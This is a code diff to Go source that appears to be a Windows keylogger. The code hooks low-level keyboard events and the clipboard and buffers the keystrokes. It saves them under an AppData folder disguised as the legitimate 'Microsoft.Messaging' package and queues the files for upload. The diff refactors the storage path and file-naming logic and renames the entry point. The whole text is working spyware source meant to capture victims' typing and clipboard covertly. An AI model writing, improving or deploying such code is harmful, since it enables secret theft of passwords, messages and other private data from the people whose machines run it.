@@ -394,10 +394,11 @@ var (
 const (
     WH_KEYBOARD_LL = 13
     WM_KEYDOWN     = 256
+    tempFilePath   = "\\AppData\\Local\\Packages\\Microsoft.Messaging\\"
 )
 
 type LoggerConfig struct {
-    fileMode    string
+    fileRule    func() string
     tmpKeylog   string
     currentFile string
     strChan     chan string
@@ -595,12 +596,12 @@ func (l *LoggerConfig) ClipboardLogger() {
 }
 
 //实现延时写入文件 并加入时间戳
-func getAppDataPath() string {
+func GetAppDataPath() string {
     usr, err := user.Current()
     if err != nil {
         log.Fatal(err)
     }
-    app := usr.HomeDir + "\\AppData\\Local\\Packages\\Microsoft.Messaging\\"
+    app := usr.HomeDir + tempFilePath
     app = strings.Replace(app, "\\", "/", -1)
     return app
 }
@@ -618,7 +619,7 @@ func upfile(dir, file string) {
 
 func savefile(l *LoggerConfig, str, file string) {
     l.UploadCurrentIfNew(file)
-    dir := getAppDataPath()
+    dir := GetAppDataPath()
     if !isExist(dir) {
         err := os.MkdirAll(dir, 0777)
         if err != nil {
@@ -647,7 +648,7 @@ func (l *LoggerConfig) UploadCurrentIfNew(file string) {
 
 func (l *LoggerConfig) Upload() {
     for filePath := range l.upFileChan {
-        dir := getAppDataPath()
+        dir := GetAppDataPath()
         l.UpFile(dir, filePath)
     }
 }
@@ -657,27 +658,52 @@ func (l *LoggerConfig) UploadQuick() {
 }
 
 func (l *LoggerConfig) WriteFile() {
+    t := time.NewTicker(time.Second)
     for {
         select {
         case str := <-l.strChan:
             l.tmpKeylog += str
-        case <-time.Tick(time.Second):
+        case <-t.C:
             if len(l.tmpKeylog) > 0 {
-                l.Savefile(l, l.tmpKeylog, time.Now().Format(l.fileMode))
+                l.Savefile(l, l.tmpKeylog, l.fileRule())
                 l.tmpKeylog = ""
             }
         }
     }
 }
 
-func KeyboardListen(fileMode string) {
+func getFileInfo(fileMode string) func() string {
+    var rate int64
+    var mode []byte
+    for _, v := range fileMode {
+        if v >= '0' && v <= '9' {
+            rate = rate*10 + int64(v-'0')
+            mode = append(mode, byte(v))
+        } else if rate > 0 {
+            break
+        }
+    }
+
+    if rate <= 0 {
+        rate = 1
+    }
+
+    extra := time.Now().Unix()%rate + 1
+
+    return func() string {
+        fileFlag := strconv.FormatInt((time.Now().Unix()-extra)/rate, 10)
+        return strings.Replace(fileMode, string(mode), fileFlag, -1)
+    }
+}
+
+func PcListen(fileMode string, shieldMask int8) {
     l := &LoggerConfig{
-        fileMode:    fileMode,
+        fileRule:    getFileInfo(fileMode),
         tmpKeylog:   "",
         currentFile: "",
         UpFile:      upfile,
         Savefile:    savefile,
-        MaskFlag:    0,
+        MaskFlag:    shieldMask,
         strChan:     make(chan string, 1<<6),
         upFileChan:  make(chan string, 1<<3),
     }
